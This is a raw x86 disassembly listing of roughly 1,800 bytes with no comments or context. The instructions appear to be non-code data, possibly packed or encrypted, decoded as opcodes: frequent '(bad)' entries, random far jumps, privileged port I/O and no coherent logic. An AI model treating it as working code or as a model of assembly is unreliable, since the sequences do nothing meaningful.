  424c40:	aam    0xda
  424c42:	enter  0x7c70,0xe7
  424c46:	stos   BYTE PTR es:[edi],al
  424c47:	cmp    ecx,DWORD PTR [ebp-0x4c60ebfe]
  424c4d:	aas    
  424c4e:	or     eax,0x1e0082b4
  424c53:	out    dx,eax
  424c54:	push   ebx
  424c55:	add    DWORD PTR [edx-0x4c01a776],esi
  424c5b:	adc    DWORD PTR [edi],esi
  424c5d:	fdivp  st(7),st
  424c5f:	cld    
  424c60:	add    al,0xa9
  424c62:	fbstp  TBYTE PTR [esi-0x15a240b6]
  424c68:	sar    edx,cl
  424c6a:	or     ebp,DWORD PTR [esi]
  424c6c:	dec    edx
  424c6d:	aaa    
  424c6e:	aam    0xd
  424c70:	pop    ss
  424c71:	call   0x9b87:0xe8c3dbf4
  424c78:	inc    esp
  424c79:	cmp    DWORD PTR [eax-0x6b],0xa5a99b20
  424c80:	and    eax,0xca15b36a
  424c85:	stos   DWORD PTR es:[edi],eax
  424c86:	mov    esi,0x725d38f5
  424c8b:	scas   eax,DWORD PTR es:[edi]
  424c8c:	(bad)  
  424c8d:	stc    
  424c8e:	rcr    DWORD PTR ds:0xb5ed0e34,1
  424c94:	inc    eax
  424c95:	not    DWORD PTR [ebx]
  424c97:	xlat   BYTE PTR ds:[ebx]
  424c98:	fsubr  st,st(3)
  424c9a:	add    al,BYTE PTR ds:0x250b1998
  424ca0:	outs   dx,BYTE PTR ds:[esi]
  424ca1:	ror    BYTE PTR [edx+0x1109e024],1
  424ca7:	push   esi
  424ca8:	mov    ch,0x1d
  424caa:	ds stc 
  424cac:	push   cs
  424cad:	test   al,0x95
  424caf:	jns    0x424d19
  424cb1:	mov    DWORD PTR [edi-0x6d],ebx
  424cb4:	test   al,ah
  424cb6:	dec    edi
  424cb7:	sbb    al,0x2
  424cb9:	out    dx,al
  424cba:	or     al,0xb
  424cbc:	outs   dx,DWORD PTR ds:[esi]
  424cbd:	pusha  
  424cbe:	into   
  424cbf:	jmp    0xdebc:0x49b8590b
  424cc6:	sub    BYTE PTR [eax+0x1b],dl
  424cc9:	mov    al,0xb0
  424ccb:	lock enter 0x8a7f,0x24
  424cd0:	xlat   BYTE PTR ds:[ebx]
  424cd1:	mov    edx,0x3b6808e4
  424cd6:	ror    DWORD PTR [edi],cl
  424cd8:	je     0x424d50
  424cda:	jbe    0x424ce3
  424cdc:	stos   BYTE PTR es:[edi],al
  424cdd:	jnp    0x424cc4
  424cdf:	dec    esi
  424ce0:	mov    edx,0x1f09923d
  424ce5:	jg     0x424cf2
  424ce7:	or     BYTE PTR [eax-0x2c],dl
  424cea:	pop    edi
  424ceb:	hlt    
  424cec:	pop    ebx
  424ced:	mov    ah,0x4
  424cef:	fld    QWORD PTR [esi]
  424cf1:	and    BYTE PTR [esi],dl
  424cf3:	loopne 0x424ce0
  424cf5:	cmp    eax,0x53f93b08
  424cfa:	cmc    
  424cfb:	sbb    DWORD PTR [eax],0xffffff9c
  424cfe:	aaa    
  424cff:	loopne 0x424d09
  424d01:	inc    esp
  424d02:	popf   
  424d03:	stos   DWORD PTR es:[edi],eax
  424d04:	test   al,0x16
  424d06:	mov    ah,0x2c
  424d08:	mov    ebx,cs
  424d0a:	fdivr  DWORD PTR ds:0xa2781b19
  424d10:	data16 stc 
  424d12:	mov    dl,0x79
  424d14:	jo     0x424d58
  424d16:	rol    BYTE PTR [esp+edx*2],1
  424d19:	add    dh,BYTE PTR [edx+0x52]
  424d1c:	mov    BYTE PTR [ecx+0x16],ch
  424d1f:	adc    al,0x6e
  424d21:	hlt    
  424d22:	outs   dx,BYTE PTR ds:[esi]
  424d23:	pop    esp
  424d24:	lods   eax,DWORD PTR ds:[esi]
  424d25:	(bad)  
  424d26:	shr    BYTE PTR [eax],cl
  424d28:	jne    0x424cea
  424d2a:	mov    WORD PTR [ecx+eax*8+0x33],gs
  424d2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d2f:	inc    ecx
  424d30:	mov    BYTE PTR fs:[edi+eax*1],al
  424d34:	lock pop ss
  424d36:	lea    eax,[ebx]
  424d38:	mov    ebp,0xe9407a5a
  424d3d:	and    BYTE PTR [ebx-0x4da5cf94],bl
  424d43:	add    BYTE PTR [ebp+0x5809c7e4],ah
  424d49:	mov    eax,ds:0x7a4aaecb
  424d4e:	mov    ds:0x287b5e7b,eax
  424d53:	xlat   BYTE PTR ds:[ebx]
  424d54:	mov    DWORD PTR [edx-0xd],0x72d53d5d
  424d5b:	ret    0xe66b
  424d5e:	and    al,0xf0
  424d60:	test   BYTE PTR [ecx+0x76],dh
  424d63:	pop    esi
  424d64:	and    ch,BYTE PTR [edx+0x1a3582a9]
  424d6a:	mov    bl,0xbc
  424d6c:	fadd   DWORD PTR [edi]
  424d6e:	mov    dh,0xdb
  424d70:	push   ds
  424d71:	add    al,0xc9
  424d73:	jae    0x424df4
  424d75:	and    al,0xda
  424d77:	cs xchg ebx,eax
  424d79:	mov    BYTE PTR [edi-0x65e41a48],ch
  424d7f:	(bad)  
  424d80:	pop    ecx
  424d81:	nop
  424d82:	popf   
  424d83:	pop    ebp
  424d84:	lods   eax,DWORD PTR ds:[esi]
  424d85:	std    
  424d86:	mov    dl,0x73
  424d88:	stos   DWORD PTR es:[edi],eax
  424d89:	loop   0x424d0f
  424d8b:	pop    esp
  424d8c:	push   eax
  424d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d8e:	inc    edx
  424d8f:	pop    eax
  424d90:	pop    esi
  424d91:	sub    al,0x72
  424d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d94:	outs   dx,BYTE PTR ds:[esi]
  424d95:	sbb    ch,0x3d
  424d98:	and    eax,0x5ce417ed
  424d9d:	push   DWORD PTR [ebx]
  424d9f:	in     eax,dx
  424da0:	mov    eax,ds:0x68e80d9a
  424da5:	ss mov bh,0xdd
  424da8:	scas   eax,DWORD PTR es:[edi]
  424da9:	adc    al,0x4e
  424dab:	iret   
  424dac:	je     0x424e24
  424dae:	aad    0x5d
  424db0:	hlt    
  424db1:	and    BYTE PTR [eax],bh
  424db3:	idiv   DWORD PTR [edx-0xa]
  424db6:	xlat   BYTE PTR ds:[ebx]
  424db7:	dec    eax
  424db8:	pusha  
  424db9:	fwait
  424dba:	inc    ecx
  424dbb:	xchg   esp,eax
  424dbc:	lock inc ebx
  424dbe:	push   ecx
  424dbf:	sbb    esp,edi
  424dc1:	mov    edi,0x5b7c5aa2
  424dc6:	add    al,0x88
  424dc8:	gs xchg edx,eax
  424dca:	js     0x424e43
  424dcc:	mov    WORD PTR [ecx],cs
  424dce:	(bad)  
  424dcf:	jp     0x424dbb
  424dd1:	dec    ebx
  424dd2:	cld    
  424dd3:	push   edi
  424dd4:	inc    edi
  424dd5:	sbb    eax,0x8c17da15
  424dda:	es mov edx,0x343cf4e3
  424de0:	mov    al,0x9c
  424de2:	and    DWORD PTR ds:0x4206b8cf,esp
  424de8:	fdiv   st(0),st
  424dea:	out    dx,al
  424deb:	mov    cl,0x44
  424ded:	nop
  424dee:	push   ds
  424def:	push   edi
  424df0:	xchg   ebp,eax
  424df1:	xchg   esi,eax
  424df2:	inc    esp
  424df3:	pop    es
  424df4:	ret    
  424df5:	push   edi
  424df6:	sub    al,0x2d
  424df8:	or     al,0x82
  424dfa:	(bad)  
  424dfb:	push   ecx
  424dfc:	sti    
  424dfd:	dec    edx
  424dfe:	and    cl,BYTE PTR [edi]
  424e00:	dec    esi
  424e01:	xchg   ebp,eax
  424e02:	ret    
  424e03:	ins    BYTE PTR es:[edi],dx
  424e04:	pop    edx
  424e05:	and    ecx,edi
  424e07:	frstor [bx]
  424e0a:	pop    ebp
  424e0b:	dec    esp
  424e0c:	(bad)  
  424e0d:	xor    eax,0xaa121632
  424e12:	ds ins BYTE PTR es:[edi],dx
  424e14:	in     eax,dx
  424e15:	popf   
  424e16:	xor    esi,DWORD PTR [edx-0x39]
  424e19:	js     0x424de9
  424e1b:	cmp    bh,BYTE PTR [eax-0x43116ee2]
  424e21:	inc    eax
  424e22:	std    
  424e23:	ss (bad) 
  424e25:	dec    ebp
  424e26:	and    bl,dh
  424e28:	add    DWORD PTR [ebp-0x7d],esi
  424e2b:	push   esp
  424e2c:	xor    al,BYTE PTR [esi]
  424e2e:	xchg   ecx,eax
  424e2f:	jns    0x424e9f
  424e31:	lahf   
  424e32:	cli    
  424e33:	add    BYTE PTR [ebx-0x20],0x11
  424e37:	imul   ebp,DWORD PTR [ebx-0x14],0x8775b175
  424e3e:	cmp    ebx,DWORD PTR [esi-0x50]
  424e41:	out    0xcc,al
  424e43:	in     al,0xee
  424e45:	les    ecx,FWORD PTR [ecx-0x79f2a2cc]
  424e4b:	ins    DWORD PTR es:[edi],dx
  424e4c:	gs add al,0x1c
  424e4f:	mov    ds:0x6384c276,al
  424e54:	loopne 0x424de5
  424e56:	ins    DWORD PTR es:[edi],dx
  424e57:	fs arpl di,cx
  424e5a:	mov    ds:0x97f1bdbd,al
  424e5f:	or     DWORD PTR [ecx],edi
  424e61:	psubb  mm1,mm1
  424e64:	or     al,0xe6
  424e66:	popf   
  424e67:	mov    dl,dl
  424e69:	std    
  424e6a:	or     eax,0x77724bf3
  424e6f:	sahf   
  424e70:	arpl   dx,sp
  424e72:	pushf  
  424e73:	add    eax,0xaa9c7434
  424e78:	xchg   ebp,eax
  424e79:	dec    esp
  424e7a:	shl    BYTE PTR [ebx-0x59],1
  424e7d:	add    al,BYTE PTR [ecx+0x15b7d6d6]
  424e83:	das    
  424e84:	jecxz  0x424eee
  424e86:	push   0xe5facbc4
  424e8b:	mov    al,ds:0x6839dae8
  424e90:	push   0xffffffa7
  424e92:	ins    BYTE PTR es:[edi],dx
  424e93:	mov    edx,0x87bb0de8
  424e98:	add    al,BYTE PTR [eax]
  424e9a:	xlat   BYTE PTR ds:[ebx]
  424e9b:	pop    es
  424e9c:	fdivr  QWORD PTR [eax-0x29]
  424e9f:	les    edi,FWORD PTR [ecx+ecx*4]
  424ea2:	add    dl,cl
  424ea4:	and    eax,DWORD PTR [ebx-0x4b215a1e]
  424eaa:	vunpckhps xmm4,xmm4,XMMWORD PTR [edx]
  424eae:	sub    ch,BYTE PTR [esi-0x323924a7]
  424eb4:	push   ds
  424eb5:	data16 adc bl,BYTE PTR [edx+0x5943bb42]
  424ebc:	sbb    eax,DWORD PTR [eax]
  424ebe:	mov    ds:0x432ea8fb,al
  424ec3:	or     al,0x73
  424ec5:	cmp    DWORD PTR [edi-0x80],eax
  424ec8:	test   BYTE PTR [edx+eax*8-0x3f],al
  424ecc:	sbb    al,0xc6
  424ece:	or     BYTE PTR [esi-0x74c6fb92],dl
  424ed4:	es jecxz 0x424e88
  424ed7:	out    dx,al
  424ed8:	pop    esi
  424ed9:	inc    ebx
  424eda:	pop    ebx
  424edb:	(bad)  
  424edc:	scas   eax,DWORD PTR es:[edi]
  424edd:	push   0x5b
  424edf:	push   ss
  424ee0:	jb     0x424e9b
  424ee2:	(bad)  
  424ee4:	cld    
  424ee5:	pop    ebx
  424ee6:	inc    esp
  424ee7:	jmp    0x424f0a
  424ee9:	(bad)  
  424eea:	mov    esi,0x3ea31e15
  424eef:	push   ds
  424ef0:	pop    ecx
  424ef1:	xor    DWORD PTR [edx-0x76],esp
  424ef4:	das    
  424ef5:	fdivr  st,st(6)
  424ef7:	or     al,0x7d
  424ef9:	mov    ah,BYTE PTR [edx+0x6e]
  424efc:	inc    eax
  424efd:	rcr    BYTE PTR [ecx+eiz*4],1
  424f00:	(bad)  
  424f01:	cmp    bh,ch
  424f03:	push   ss
  424f04:	jle    0x424f74
  424f06:	pop    edi
  424f07:	or     bh,BYTE PTR [edx+0x7]
  424f0a:	fistp  QWORD PTR ds:0x436626ac
  424f10:	jo     0x424f35
  424f12:	fstp   TBYTE PTR [ebx+0x7e]
  424f15:	mov    ch,0x94
  424f17:	fistp  DWORD PTR [edx]
  424f19:	dec    eax
  424f1a:	test   DWORD PTR [eax],esp
  424f1c:	dec    edi
  424f1d:	pusha  
  424f1e:	cs pop eax
  424f20:	mov    eax,0xcb4876c5
  424f25:	mov    eax,ds:0x98624872
  424f2a:	aaa    
  424f2b:	push   ebx
  424f2c:	push   eax
  424f2d:	mov    al,0xb3
  424f2f:	sbb    BYTE PTR [ebx],al
  424f31:	inc    edi
  424f32:	arpl   WORD PTR [edx-0x13],sp
  424f35:	pop    eax
  424f36:	bnd jo 0x424f85
  424f39:	retf   
  424f3a:	inc    ecx
  424f3b:	jp     0x424f32
  424f3d:	push   esi
  424f3e:	scas   al,BYTE PTR es:[edi]
  424f3f:	test   al,0x3e
  424f41:	ss dec eax
  424f43:	sahf   
  424f44:	cmp    eax,0x7032b2c7
  424f49:	add    eax,0xec1d23ab
  424f4e:	pusha  
  424f4f:	loope  0x424f5a
  424f51:	or     BYTE PTR [ebp+0x2c],0xeb
  424f55:	sub    DWORD PTR [ecx+0x4a1b3b7d],edi
  424f5b:	lahf   
  424f5c:	xlat   BYTE PTR ds:[ebx]
  424f5d:	dec    esp
  424f5e:	call   0xd9a6:0x59bc7193
  424f65:	mov    ds:0xc25635e5,al
  424f6a:	into   
  424f6b:	sub    BYTE PTR [eax+0x6e15c4c],0x89
  424f72:	shr    DWORD PTR [ebp+edx*2-0x2e],1
  424f76:	retf   
  424f77:	pop    ss
  424f78:	inc    esp
  424f79:	cmp    DWORD PTR [eax+0x2d],edi
  424f7c:	arpl   WORD PTR [ebp+0x51737f2d],cx
  424f82:	xchg   ebp,eax
  424f83:	jae    0x424f42
  424f85:	ja     0x424fcd
  424f87:	dec    ecx
  424f88:	push   cs
  424f89:	add    DWORD PTR [edi+0x79edf2d3],esi
  424f8f:	dec    eax
  424f90:	or     al,BYTE PTR [edi+0x7f69429b]
  424f96:	(bad)  
  424f97:	inc    dh
  424f99:	adc    al,BYTE PTR [esi+esi*8-0x2a]
  424f9d:	into   
  424f9e:	jne    0x424f36
  424fa0:	jbe    0x424f7b
  424fa2:	lds    edx,FWORD PTR [edi]
  424fa4:	push   ds
  424fa5:	jae    0x424f5b
  424fa7:	(bad)  
  424fa8:	mov    edi,0x9270ad6d
  424fad:	lods   eax,DWORD PTR ds:[esi]
  424fae:	into   
  424faf:	inc    esi
  424fb0:	sub    esi,DWORD PTR [eax+ebp*1]
  424fb3:	into   
  424fb4:	(bad)  
  424fb5:	shl    BYTE PTR [esi+esi*2-0x5f],1
  424fb9:	or     dh,ah
  424fbb:	mov    al,ds:0xa8bae9d9
  424fc0:	inc    ebp
  424fc1:	stos   BYTE PTR es:[edi],al
  424fc2:	xor    ah,bl
  424fc4:	cmp    DWORD PTR [esi+ebp*4-0x328ba7f2],ecx
  424fcb:	lds    ebx,FWORD PTR [ebx-0x6a]
  424fce:	push   ebp
  424fcf:	ins    DWORD PTR es:[edi],dx
  424fd0:	call   0x110ba5cb
  424fd5:	sbb    BYTE PTR [eax+edi*2+0x240d670],al
  424fdc:	pop    ss
  424fdd:	out    dx,al
  424fde:	push   edi
  424fdf:	jb     0x425048
  424fe1:	mov    bl,0x6a
  424fe3:	int3   
  424fe4:	pop    ebp
  424fe5:	aas    
  424fe6:	mov    al,0xcc
  424fe8:	mov    al,ds:0x76841279
  424fed:	sub    edi,DWORD PTR [edx+ebx*4-0x4d65f213]
  424ff4:	lods   al,BYTE PTR ds:[esi]
  424ff5:	sahf   
  424ff6:	mov    esi,0x6f80eaeb
  424ffb:	icebp  
  424ffc:	pop    ss
  424ffd:	leave  
  424ffe:	scas   eax,DWORD PTR es:[edi]
  424fff:	mov    bl,BYTE PTR [eax+0x559283d0]
  425005:	cmc    
  425006:	popa   
  425007:	fcomp  DWORD PTR [ebp+0x168034e8]
  42500d:	adc    al,0x7b
  42500f:	sub    cl,BYTE PTR [esp+esi*1-0x4f]
  425013:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425014:	pop    es
  425015:	mov    al,ds:0x5534bdc1
  42501a:	cmp    eax,0x4ef344f5
  42501f:	xor    al,al
  425021:	cmp    dh,BYTE PTR [eax]
  425023:	in     eax,0xc5
  425025:	xchg   edx,eax
  425026:	dec    esp
  425027:	jb     0x42505f
  425029:	fdecstp 
  42502b:	icebp  
  42502c:	lods   al,BYTE PTR ds:[esi]
  42502d:	ret    
  42502e:	add    BYTE PTR [edx],0x0
  425031:	into   
  425032:	jl     0x425032
  425034:	loopne 0x425008
  425036:	push   es
  425037:	lods   al,BYTE PTR ds:[esi]
  425038:	mov    ch,0x2
  42503a:	cmp    eax,0x6065f7b1
  42503f:	pushf  
  425040:	aam    0x79
  425042:	aaa    
  425043:	mov    dl,0xc1
  425045:	outs   dx,BYTE PTR ds:[esi]
  425046:	cld    
  425047:	or     BYTE PTR [ebx+0x7776c336],ch
  42504d:	popf   
  42504e:	ins    DWORD PTR es:[edi],dx
  42504f:	outs   dx,DWORD PTR ds:[esi]
  425050:	loope  0x425068
  425052:	(bad)  
  425053:	in     al,0x8e
  425055:	xchg   ebp,eax
  425056:	push   ecx
  425057:	test   DWORD PTR [esi-0x5d95bdba],edi
  42505d:	sbb    al,BYTE PTR [ecx+0x513a031a]
  425063:	inc    ebp
  425064:	pop    eax
  425065:	jmp    0xe546:0xa10c917b
  42506c:	sbb    edi,ecx
  42506e:	mov    eax,ds:0xee90e13e
  425073:	jge    0x42505d
  425075:	fidiv  DWORD PTR [eax-0x337cce17]
  42507b:	enter  0x4054,0x19
  42507f:	(bad)  [edi]
  425081:	xchg   ah,al
  425083:	add    ebp,DWORD PTR [ecx]
  425085:	cwde   
  425086:	fdiv   DWORD PTR [ecx-0x2cc2cf0e]
  42508c:	sub    al,0xa3
  42508e:	xor    al,0x38
  425090:	mov    ds:0x6a154136,al
  425095:	mov    bl,0x60
  425097:	shl    BYTE PTR [edi],0xb9
  42509a:	xor    bh,0x49
  42509d:	jecxz  0x425048
  42509f:	aas    
  4250a0:	mov    eax,ds:0xf395bb58
  4250a5:	add    al,0x9c
  4250a7:	sbb    al,0x14
  4250a9:	arpl   WORD PTR [eax],cx
  4250ab:	sub    al,0xf7
  4250ad:	jp     0x425083
  4250af:	cmp    ah,BYTE PTR [edx+0x75]
  4250b2:	shl    BYTE PTR [esi],0x26
  4250b5:	push   ebx
  4250b6:	rcl    DWORD PTR ds:[ebx+ebp*8-0x40],cl
  4250bb:	inc    eax
  4250bc:	mov    esp,0x45b5be36
  4250c1:	call   0x8111:0xaabb3d54
  4250c8:	or     eax,0x5c809a1e
  4250cd:	enter  0x1eb,0x4f
  4250d1:	mov    cl,0xea
  4250d3:	jne    0x4250dc
  4250d5:	mov    dh,0x9c
  4250d7:	outs   dx,BYTE PTR ds:[esi]
  4250d8:	mov    ebx,0xa1f5850b
  4250dd:	out    0x1b,al
  4250df:	shr    BYTE PTR [edx+0x66],0x44
  4250e3:	imul   esp,DWORD PTR [ebx+0x6158d0ad],0x9511a176
  4250ed:	aaa    
  4250ee:	push   es
  4250ef:	pop    ecx
  4250f0:	(bad)  
  4250f1:	pop    ss
  4250f2:	push   esi
  4250f3:	and    BYTE PTR [edx-0x34],ch
  4250f6:	clc    
  4250f7:	sahf   
  4250f8:	(bad)  
  4250f9:	sub    edi,DWORD PTR [esi]
  4250fb:	and    dh,BYTE PTR [ecx+0x1]
  4250fe:	mov    edi,DWORD PTR [esi]
  425100:	adc    ah,dl
  425102:	xchg   esi,eax
  425103:	mov    esp,edi
  425105:	retf   0xb3b3
  425108:	lahf   
  425109:	repnz pop ecx
  42510b:	push   ebp
  42510c:	push   esp
  42510d:	push   edx
  42510e:	pop    esp
  42510f:	push   ebx
  425110:	pop    edi
  425111:	pop    edi
  425112:	xchg   ebx,eax
  425113:	stos   DWORD PTR es:[edi],eax
  425114:	mov    ebx,0x32c38796
  425119:	pop    es
  42511a:	dec    eax
  42511b:	fild   WORD PTR [ecx]
  42511d:	add    BYTE PTR [eax+0x7c000006],cl
  425123:	cld    
  425124:	mov    al,ds:0x66d2511e
  425129:	lock mov WORD PTR [ebp+0xbdb1bb7],cs
  425130:	pop    es
  425131:	jo     0x4251b0
  425133:	or     BYTE PTR [ebp+0x4a8e9c99],dh
  425139:	mov    esp,0x10342a4c
  42513e:	arpl   WORD PTR [edx-0x14059cbc],ax
  425144:	adc    bl,ch
  425146:	fwait
  425147:	in     al,dx
  425148:	aas    
  425149:	adc    dh,bh
  42514b:	jbe    0x4251b9
  42514d:	test   al,0x5a
  42514f:	leave  
  425150:	retf   
  425151:	(bad)  
  425152:	lds    ecx,FWORD PTR [eax]
  425154:	push   esp
  425155:	ds lahf 
  425157:	pop    ebp
  425158:	xor    eax,0x38ac9793
  42515d:	lock loopne 0x425155
  425160:	icebp  
  425161:	ds out 0x1d,eax
  425164:	push   edi
  425165:	adc    bh,BYTE PTR [ebx+0x11755973]
  42516b:	leave  
  42516c:	test   eax,0xbc302fd1
  425171:	popf   
  425172:	addr16 mov esi,0x6ac10ba9
  425178:	leave  
  425179:	sub    ebx,DWORD PTR [ebp+0x5ec870ff]
  42517f:	jmp    0x425102
  425181:	data16 outs dx,BYTE PTR ds:[esi]
  425183:	jmp    0x6790:0xf8cdd779
  42518a:	jmp    0x3bd1:0x2bf2c4d5
  425191:	int    0x17
  425193:	icebp  
  425194:	js     0x4251a7
  425196:	sub    al,0xe8
  425198:	dec    esp
  425199:	push   ds
  42519a:	fwait
  42519b:	add    al,0x41
  42519d:	aas    
  42519e:	daa    
  42519f:	jle    0x4251bb
  4251a1:	push   edi
  4251a2:	mov    bl,0x34
  4251a4:	cmp    esi,DWORD PTR ds:0x4ce04abf
  4251aa:	adc    ecx,esp
  4251ac:	(bad)  
  4251ad:	cmp    al,0x2d
  4251af:	mov    edi,DWORD PTR [edi-0x63]
  4251b2:	scas   eax,DWORD PTR es:[edi]
  4251b3:	cmp    eax,0x2fd61244
  4251b8:	xchg   esp,eax
  4251b9:	mov    ah,0x55
  4251bb:	lea    eax,[edx-0x49dd0856]
  4251c1:	aad    0x53
  4251c3:	je     0x425198
  4251c5:	daa    
  4251c6:	mov    ebp,0x9b71beba
  4251cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4251cc:	stos   BYTE PTR es:[edi],al
  4251cd:	aas    
  4251ce:	adc    al,0x21
  4251d0:	outs   dx,BYTE PTR ds:[esi]
  4251d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251d2:	jmp    0x4251ba
  4251d4:	mov    al,ds:0xb2dc3cfb
  4251d9:	pop    ebp
  4251da:	in     eax,0xbd
  4251dc:	into   
  4251dd:	pop    eax
  4251de:	jecxz  0x4251d7
  4251e0:	inc    ebx
  4251e1:	adc    bh,BYTE PTR [esi+0x4ff1c6be]
  4251e7:	jl     0x425234
  4251e9:	and    bh,BYTE PTR [esi-0x790bcd0c]
  4251ef:	cld    
  4251f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251f1:	out    0x29,al
  4251f3:	push   ds
  4251f4:	ffree  st(6)
  4251f6:	xchg   esp,eax
  4251f7:	adc    DWORD PTR [edx],edx
  4251f9:	clc    
  4251fa:	int    0xda
  4251fc:	mov    ch,0xc8
  4251fe:	xchg   esp,eax
  4251ff:	popa   
  425200:	cmp    eax,DWORD PTR [ebx-0x43]
  425203:	jecxz  0x4251f9
  425205:	(bad)  
  425206:	call   0x4da4499a
  42520b:	mov    WORD PTR [ecx+edi*1+0x1],ds
  42520f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425210:	push   cs
  425211:	or     dl,BYTE PTR [edi]
  425213:	mov    ch,0x24
  425215:	fidivr WORD PTR [ebx]
  425217:	push   es
  425218:	xor    al,BYTE PTR [edi]
  42521a:	push   ecx
  42521b:	out    dx,eax
  42521c:	pop    edx
  42521d:	or     BYTE PTR [edi-0x50],al
  425220:	push   esi
  425221:	jg     0x4251b1
  425223:	lock ss sbb eax,0x580f8e2c
  42522a:	fstp   TBYTE PTR [ecx]
  42522c:	enter  0x4d94,0x5e
  425230:	mov    edx,0x6e922299
  425235:	out    0x95,al
  425237:	in     al,0x98
  425239:	mov    ecx,0x7c9a4828
  42523e:	das    
  42523f:	es adc eax,0x300d3f5d
  425245:	rol    DWORD PTR [esi+0x6302ccb8],1
  42524b:	stc    
  42524c:	adc    bh,BYTE PTR [ebx]
  42524e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42524f:	mov    esi,0x44ddec5a
  425254:	fisub  WORD PTR [ecx+0x6a]
  425257:	icebp  
  425258:	test   BYTE PTR [ecx+0x60],dl
  42525b:	pop    ecx
  42525c:	pop    ebp
  42525d:	test   BYTE PTR [esi+0x67],ch
  425260:	sbb    DWORD PTR [esi-0x52],ebp
  425263:	mov    esi,eax
  425265:	(bad)  
  425266:	dec    eax
  425267:	inc    edx
  425268:	mov    bh,0xaa
  42526a:	push   ebp
  42526b:	push   es
  42526c:	mov    ecx,0x556e44fe
  425271:	adc    edi,DWORD PTR [ebx+0x60b8d32]
  425277:	mov    ds:0x3454f252,al
  42527c:	imul   esp,DWORD PTR [ebx],0x1a
  42527f:	(bad)
  425282:	stos   DWORD PTR es:[edi],eax
  425283:	xor    dl,BYTE PTR [esi+edi*1+0x1]
  425287:	cli    
  425288:	cwde   
  425289:	cmp    esp,DWORD PTR [ebx-0x1b8f260a]
  42528f:	stos   BYTE PTR es:[edi],al
  425290:	sub    cl,BYTE PTR [ebp+0x42feee29]
  425296:	xchg   DWORD PTR [edi],edx
  425298:	call   0x3589eddd
  42529d:	mov    ds:0x4b5e6b1c,al
  4252a2:	sbb    eax,0x8eb7ce66
  4252a7:	dec    edi
  4252a8:	imul   edi,ebx,0x58
  4252ab:	jo     0x4252f6
  4252ad:	fdivr  DWORD PTR [ecx]
  4252af:	js     0x4252af
  4252b1:	pop    esi
  4252b2:	lahf   
  4252b3:	jns    0x42523d
  4252b5:	ds mov cl,0xd9
  4252b8:	inc    ebp
  4252b9:	sub    dh,BYTE PTR [edx-0x3d410358]
  4252bf:	fdiv   DWORD PTR [eax+0x212593c9]
  4252c5:	mov    dh,BYTE PTR [esi]
  4252c7:	popf   
  4252c8:	sbb    al,cl
  4252ca:	mov    eax,0x6e49166b
  4252cf:	mov    dh,0xe8
  4252d1:	aas    
  4252d2:	(bad)  
  4252d3:	jbe    0x4252f0
  4252d5:	lock jle 0x42525d
  4252d8:	imul   esp,DWORD PTR [ebx+0x20],0xffffffdf
  4252dc:	rol    BYTE PTR ds:0xc014244c,1
  4252e2:	pmaxsw mm7,QWORD PTR [ebx-0x34]
  4252e6:	inc    eax
  4252e7:	push   ds
  4252e8:	dec    edi
  4252e9:	xor    DWORD PTR [eax-0x1c1e0cbe],edx
  4252ef:	jmp    0x7c08:0xbbbc743b
  4252f6:	mov    bl,0x5
  4252f8:	adc    BYTE PTR [esi-0x6d],0xd
  4252fc:	out    0x1d,eax
  4252fe:	push   ebp
  4252ff:	stos   BYTE PTR es:[edi],al
  425300:	stos   DWORD PTR es:[edi],eax
  425301:	jl     0x42528f
  425303:	aam    0x50
  425305:	inc    ebp
  425306:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425308:	dec    esi
  425309:	lds    ebp,FWORD PTR [esp+eiz*8]
  42530c:	adc    DWORD PTR [ebx-0x19],eax
  42530f:	sub    al,0x2d
  425311:	call   0xc5852161
  425316:	sub    al,0x46
  425318:	leave  
  425319:	pop    ebx
  42531a:	jl     0x42533e
  42531c:	test   DWORD PTR [ecx],edx
  42531e:	int3   
  42531f:	scas   al,BYTE PTR es:[edi]
  425320:	sar    DWORD PTR [ebp-0x33],cl
  425323:	mov    ebp,0x4cf01b5e
  425328:	mov    dh,0x49
  42532a:	fld    TBYTE PTR [ebp+0x63]
  42532d:	push   ebx
  42532e:	xchg   ebp,eax
  42532f:	xchg   edi,eax
  425330:	(bad)  
  425331:	out    0xd8,eax
  425333:	fnstenv [edx+ebx*1-0x1e]
  425337:	pop    eax
  425338:	sbb    eax,0xe271d4b
  42533d:	xchg   ebx,eax
  42533e:	stos   DWORD PTR es:[edi],eax
  42533f:	out    dx,eax
  425340:	stos   DWORD PTR es:[di],eax
  425342:	pop    es
  425343:	push   edx
  425344:	xor    dl,BYTE PTR [ebp+0x299c3009]
  42534a:	dec    esi
  42534b:	push   ds
  42534c:	aas    
  42534d:	jae    0x42530b
  42534f:	push   eax
  425350:	aam    0xae
  425352:	xchg   DWORD PTR [eax],esi
  425354:	add    BYTE PTR [esi],dl
  425356:	stc    
  425357:	cmp    esp,0x9d9bfcd2
  42535d:	xor    BYTE PTR [edi-0x16],ch
  425360:	pop    edx
  425361:	iret   
  425362:	mov    esp,0x36613cc8
  425367:	pop    es
  425368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425369:	or     edi,ebx
  42536b:	rol    ebx,1
  42536d:	retf   
  42536e:	js     0x42534a
  425370:	sti    
  425371:	shl    DWORD PTR [esi],1
  425373:	and    dl,dl
  425375:	adc    edi,DWORD PTR [edx+0x42]
  425378:	xor    eax,0x3e4d509b
  42537d:	cdq    
  42537e:	imul   esp,esp,0x7d
  425381:	inc    esp
  425382:	push   0x84b51ea1
  425387:	push   eax
  425388:	pushw  0x416b
  42538c:	jecxz  0x4253dc
  42538e:	jle    0x42539f
  425390:	stos   BYTE PTR es:[edi],al
  425391:	sahf   
  425392:	pop    ebp
  425393:	retf   0x1f5b
  425396:	jns    0x42531a
  425398:	iret   
  425399:	or     DWORD PTR [edx+0xcae03a8],eax
  42539f:	pop    esi
  4253a0:	mov    bl,0x4b
  4253a2:	out    dx,al
  4253a3:	int    0xb1
  4253a5:	adc    al,0x94
  4253a7:	push   cs
  4253a8:	mov    esi,0x9a8ad7cc
  4253ad:	dec    ebx
